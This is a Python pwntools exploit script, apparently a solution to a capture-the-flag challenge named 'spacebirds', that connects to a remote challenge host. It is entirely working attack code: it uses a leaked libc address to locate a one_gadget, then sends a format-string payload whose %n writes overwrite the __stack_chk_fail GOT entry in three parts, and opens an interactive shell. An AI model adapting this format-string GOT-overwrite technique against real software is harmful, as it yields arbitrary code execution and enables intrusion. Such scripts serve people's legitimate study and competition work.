from pwn import *
from sys import exit
#io = process("./chal.bin")
io = remote("spaceheroes-pwn-spacebirds.chals.io", 443, ssl=True, sni="spaceheroes-pwn-spacebirds.chals.io")
libc = ELF("./libc.so.6")
stackFailGot = 0x602020

io.recvuntil("Serial Code: ")
libc.address = int(io.recvline()[:-1],16) - libc.symbols["rand"]
one_gadget  = libc.address + 0xe3b01
gadgetP1 = one_gadget & 0xffff
gadgetP2 = (one_gadget & 0xffffffff) >> 16
gadgetP3 = one_gadget >> 32

print(hex(gadgetP1))
print(hex(gadgetP2))
print(hex(gadgetP3))

if (gadgetP1 < gadgetP2) and (gadgetP2 < gadgetP3):
    print("can work")
else:
    print("gg")
    exit(1)


#gdb.attach(io,gdbscript="break *0x400a34\nbreak *0x400a39\n c")

formatStr  = b"%" + bytes(str(gadgetP1).encode()) + b"x%12$n"
formatStr += b"%" + bytes(str(gadgetP2 - gadgetP1).encode()) + b"x%13$n"
formatStr += b"%" + bytes(str(gadgetP3 - gadgetP2).encode()) + b"x%14$n"
formatStr = formatStr.ljust(48,b"A") # so that the index of the addresses can always stay constant
formatStr += p64(stackFailGot) + p64(stackFailGot + 2) + p64(stackFailGot + 4)
formatStr = formatStr.ljust(105,b"A")

io.sendlineafter("Report updated drone sightings in your area >>>",formatStr)

io.interactive()
